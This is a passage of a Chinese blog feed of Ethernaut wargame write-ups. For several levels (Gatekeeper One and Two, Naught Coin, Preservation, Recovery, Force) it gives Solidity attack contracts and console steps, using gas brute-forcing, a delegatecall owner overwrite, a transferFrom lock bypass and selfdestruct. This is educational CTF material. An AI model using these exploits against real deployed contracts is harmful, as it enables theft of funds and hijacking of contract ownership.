class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目想要我们执行enter方法，并且要通过三个修饰器的检查。<br/><br>我们把三个修饰器分开来分析：</p><ul><li>require(msg.sender != tx.origin);<br>这个条件我们再之前做题的时候遇到过，只需要再调用函数时增加一个中间函数，就可以使<code>msg.sender != tx.origin</code></li><li>require(gasleft().mod(8191) == 0);这个条件会比较麻烦一点，gasleft函数返回的是交易剩余的gas量，所以我们只要让gas为8191*n+x即可，其中x为我们此次交易所消耗的gas。理论上来讲可以通过debug得到，但是由于不知道目标合约的编译器版本，所以无法精准得到这个值。但我们可以通过gas爆破来解决。毕竟gas毕竟是在一个范围区间之中的。</li><li><p>require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));<br>require(uint32(uint64(_gateKey)) != uint64(_gateKey));<br>require(uint32(uint64(_gateKey)) == uint16(tx.origin));<br>这个条件要求我们先了解solidity中类型转换的规则<a href="https://www.tutorialspoint.com/solidity/solidity_conversions.htm#:~:text=Solidity%20compiler%20allows%20implicit%20conversion,value%20not%20allowed%20in%20uint256." target="_blank" rel="noopener">参考链接</a><br/><br>这里以_gateKey是0x12345678deadbeef为例说明</p><blockquote><ol><li>uint32(uint64(_gateKey))转换后会取低位，所以变成0xdeadbeef，uint16(uint64(_gateKey))同理会变成0xbeef，uint16和uint32在比较的时候，较小的类型uint16会在左边填充0，也就是会变成0x0000beef和0xdeadbeef做比较，因此想通过第一个require只需要找一个形为0x????????0000????这种形式的值即可，其中?是任取值。</li><li>第二步要求双方不相等，只需高4个字节中任有一个bit不为0即可</li><li>通过前面可知，uint32(uint64(_gateKey))应该是类似0x0000beef这种形式，所以只需要让最低的2个byte和tx.origin地址最低的2个byte相同即可，也就是，key的最低2个字节设置为合约地址的低2个字节。这里tx.origin就是metamask的账户地址</li></ol></blockquote><p>攻击合约：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperOne &#123;</span><br><span class="line">    function entrant() external returns (address);</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    GatekeeperOne gatekeeperOne;</span><br><span class="line">    address target;</span><br><span class="line">    address entrant;</span><br><span class="line"></span><br><span class="line">    event log(bool);</span><br><span class="line">    event logaddr(address);</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        &#x2F;&#x2F; 设置为题目地址</span><br><span class="line">        target &#x3D; _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        &#x2F;&#x2F; 后四位是metamask上账户地址的低2个字节</span><br><span class="line">        bytes8 key&#x3D;0xAAAAAAAA0000Ff67;</span><br><span class="line">        bool result;</span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; 120; i++) &#123;&#x2F;&#x2F;gas爆破</span><br><span class="line">            (bool result, bytes memory data) &#x3D; address(target).call&#123;gas:i + 150 + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        emit log(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getentrant() public &#123;</span><br><span class="line">        gatekeeperOne &#x3D; GatekeeperOne(target);</span><br><span class="line">        entrant &#x3D; gatekeeperOne.entrant();</span><br><span class="line">        emit logaddr(entrant);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>解题步骤<br>执行exploit方法后执行getentrant,可以在交易详细中看到提交上来的事务中address已经为我们的地址。通关</p></li></ul><h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><p>在做了第一道守门人后，这道题目看起来就easy很多了<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x :&#x3D; extcodesize(caller()) &#125;</span><br><span class="line">    require(x &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) &#x3D;&#x3D; uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>一样的有三个函数修饰器需要满足，我们依旧分开来说</p><ul><li><strong>require(msg.sender != tx.origin);</strong><br>这个和上一个的第一个条件一样，不再赘述，建一个合约就行。</li><li><p><strong>uint x</strong><br><strong>assembly { x := extcodesize(caller()) }</strong><br><strong>require(x == 0);</strong><br>这里涉及到了solidity中的汇编语言，<a href="https://solidity-cn.readthedocs.io/zh/develop/assembly.html#" target="_blank" rel="noopener">参考文档</a>，在这里<code>caller</code>是调用的发起者，<code>extcodesize(a)</code>会返回地址 a 的代码大小。<br>关于这点，需要使用一个特性绕过：当合约正在执行构造函数constructor并部署时，其extcodesize为0。换句话说，如果我们在constructor中调用这个函数的话，那么extcodesize(caller())返回0，因此可以绕过检查。</p></li><li><p><strong>require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);</strong><br>这个条件其实就是一个简单的异或，我们只需要反过来异或一次算出来的结果就是key<br/></p></li></ul><p>攻击合约:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack&#123;</span><br><span class="line">    address target;</span><br><span class="line">    constructor(address _adr) public&#123;</span><br><span class="line">        target &#x3D; _adr;</span><br><span class="line">        bytes8 password &#x3D; bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  uint64(0) - 1);</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,password));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15 Naught Coin"></a>15 Naught Coin</h2><p>这关考查对ERC20的了解<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;https:&#x2F;&#x2F;github.com&#x2F;OpenZeppelin&#x2F;openzeppelin-contracts&#x2F;blob&#x2F;release-v3.2.0&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; string public constant name &#x3D; &#39;NaughtCoin&#39;;</span><br><span class="line">  &#x2F;&#x2F; string public constant symbol &#x3D; &#39;0x0&#39;;</span><br><span class="line">  &#x2F;&#x2F; uint public constant decimals &#x3D; 18;</span><br><span class="line">  uint public timeLock &#x3D; now + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) public &#123;</span><br><span class="line">    player &#x3D; _player;</span><br><span class="line">    INITIAL_SUPPLY &#x3D; 1000000 * (10**uint256(decimals()));</span><br><span class="line">    &#x2F;&#x2F; _totalSupply &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    &#x2F;&#x2F; _balances[player] &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender &#x3D;&#x3D; player) &#123;</span><br><span class="line">      require(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>光看这个函数修饰器是没有漏洞可言的，但问题是，ERC20有两个转账函数，题目中只对<code>transfer</code>这一个函数做了修饰，也就是说，我们可以使用另一个函数进行转账-<code>transferFrom</code></p><ul><li>解题步骤<br>直接在控制台操作即可，但要注意，在转账操作之前我们需要先approve<br>val=’1000000000000000000000000’<br>addr=’0x5B38Da6a701c568545dCfcB03FcB875f56beddC4’<ol><li>contract.approve(player,val)</li><li>contract.transferFrom(player,addr,val)</li></ol></li></ul><h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16 Preservation"></a>16 Preservation</h2><p>这关是对delegatecall漏洞的考查，大家可以看我对delegatecall的另一篇文章<a href="../Delegatecall.html">delegatecall杂谈</a><br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  &#x2F;&#x2F; Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature &#x3D; bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library &#x3D; _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library &#x3D; _timeZone2LibraryAddress; </span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime &#x3D; _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>由于delegatecall的执行环境是当前合约，所以如果要调用的函数内有修改变量的操作，将会导致自身的<strong>对应储存位上</strong>的变量被恶意修改，具体可以参考我的另一篇博客。<br/><br>利用这一点，我们可以实现攻击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function setTime(uint _time) public &#123;</span><br><span class="line">        owner &#x3D; address(_time);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>由于在perservation里，owner是在第2个存储位，所以我们这里需要两个变量来”占位”,这样就可以做到恶意修改被攻击合约的owner的目的。</p><ul><li>解题步骤</li></ul><ol><li>执行<code>setFirstTime</code>函数，将我们的攻击合约地址作为参数传进去，可以看到此时timeZone1Library已经变为我们攻击合约的地址。<br><img src="1.jpg" alt=""><br><img src="2.jpg" alt=""></li><li>再次执行<code>setFirstTime</code>，此时调用的就是我们的攻击合约了，我们只需要把我们自己的地址作为参数传进去，就可以完成攻击。</li></ol><h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17 Recovery"></a>17 Recovery</h2><p>这关考查对区块链浏览器的使用和destroy函数<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts-ethereum-package&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  &#x2F;&#x2F; public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name &#x3D; _name;</span><br><span class="line">    balances[_creator] &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; msg.value.mul(10);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;&#x3D; _amount);</span><br><span class="line">    balances[msg.sender] &#x3D; balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] &#x3D; _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目中给到了一个合约地址，是<code>Recovery</code>的地址，题目中说创建者通过Recovery创建了一个SimpleToken，然后把地址给忘了，要我们找到这个地址并且把里面的钱弄出来。很容易，通过区块链浏览器就可以找到他创建的<code>SimpleToken</code>。<br/><br>在 <a href="https://rinkeby.etherscan.io/" target="_blank" rel="noopener">https://rinkeby.etherscan.io/</a> 上搜索Recovery的地址，然后我们就可以看到他的创建合约交易，点进去就可以找到合约地址。<br><img src="3.jpg" alt=""><br>得到地址后，我们只需要执行合约的自毁函数即可<br/><br>攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    address payable target;</span><br><span class="line">    address payable owner;</span><br><span class="line">    constructor(address payable _target, address payable _own) public&#123;</span><br><span class="line">        target &#x3D; _target;</span><br><span class="line">        owner &#x3D; _own;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function dosome() public &#123;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;destroy(address)&quot;,owner));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><blockquote><p>在执行dosome()方法的时候最好把交易的gaslimit调高一点，我在执行时如果不调gaslimit是会执行失败的，如图：<br><img src="4.jpg" alt=""></p></blockquote><h2 id="18-Magic-Number"><a href="#18-Magic-Number" class="headerlink" title="18 Magic Number"></a>18 Magic Number</h2><p>这是一个考察solidity操作码的题目<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver &#x3D; _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    ____________&#x2F;\\\_______&#x2F;\\\\\\\\\_____        </span><br><span class="line">     __________&#x2F;\\\\\_____&#x2F;\\\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\___       </span><br><span class="line">      ________&#x2F;\\\&#x2F;\\\____\&#x2F;&#x2F;&#x2F;______\&#x2F;&#x2F;\\\__      </span><br><span class="line">       ______&#x2F;\\\&#x2F;\&#x2F;\\\______________&#x2F;\\\&#x2F;___     </span><br><span class="line">        ____&#x2F;\\\&#x2F;__\&#x2F;\\\___________&#x2F;\\\&#x2F;&#x2F;_____    </span><br><span class="line">         __&#x2F;\\\\\\\\\\\\\\\\_____&#x2F;\\\&#x2F;&#x2F;________   </span><br><span class="line">          _\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\&#x2F;&#x2F;____&#x2F;\\\&#x2F;___________  </span><br><span class="line">           ___________\&#x2F;\\\_____&#x2F;\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\&#x2F;&#x2F;&#x2F;_____\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;__</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>部署一个只有 10 个 opcode 的合约，该合约在调用后返回 42。<br>因此我们必须使用字节码手动编写一个程序</p><h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19 Alien Codex"></a>19 Alien Codex</h2><p>又是一道关于内存布局的题目</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ethernaut 题解 07-12</title>
      <link href="/2022-11-03-ethernaut02/"/>
      <url>/2022-11-03-ethernaut02/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut靶场刷题记录-7-12"><a href="#Ethernaut靶场刷题记录-7-12" class="headerlink" title="Ethernaut靶场刷题记录(7-12)"></a>Ethernaut靶场刷题记录(7-12)</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="07-Force"><a href="#07-Force" class="headerlink" title="07 Force"></a>07 Force</h2><p>这道题是为了考查我们对自毁函数<code>selfdestruct</code>的认识<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;&#x2F;*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         &#x2F;\_&#x2F;\   &#x2F;</span><br><span class="line">    ____&#x2F; o o \</span><br><span class="line">  &#x2F;~____  &#x3D;ø&#x3D; &#x2F;</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*&#x2F;&#125;</span><br></pre></td></tr></table></figure><br>这就是一个空合约，题目想要我们给这个合约转一笔账，可我们知道，一个没有任何函数的合约是没有办法接收转账的。者就用到了自毁函数<code>selfdestruct</code></p><blockquote><p>自毁函数selfdestruct：<br>    当我们调用这个函数时，它会使合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数。（因为之前提到，如果合约收到一笔没有任何函数可以处理的资金时，就会调用fallback函数，而selfdestruct函数无视这一点，也就是资金会优先由selfdestruct函数处理）</p></blockquote><p>我们只需要自己写一个新合约，往里面存一点测试币，然后调用自毁函数<code>selfdestruct</code>将参数设置为此合约的地址，我们合约里的token<br>就会转到此合约当中。<br/><br>攻击合约如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Attck&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">receive() payable external&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function dosome() public payable&#123;</span><br><span class="line">    selfdestruct(0x0F8AaD423dc5aE12382CEc67412dADb6e2b0eFF3);&#x2F;&#x2F;Force的地址</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>解题步骤</li></ul><ol><li>直接使用metamask给我自己的攻击合约转账<br><img src="01.png" alt=""></li><li>执行攻击合约的dosome函数</li><li>通关</li></ol><h1 id="09-King"><a href="#09-King" class="headerlink" title="09 King"></a>09 King</h1><p>这是一个Dos攻击（拒绝服务）型的漏洞<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span 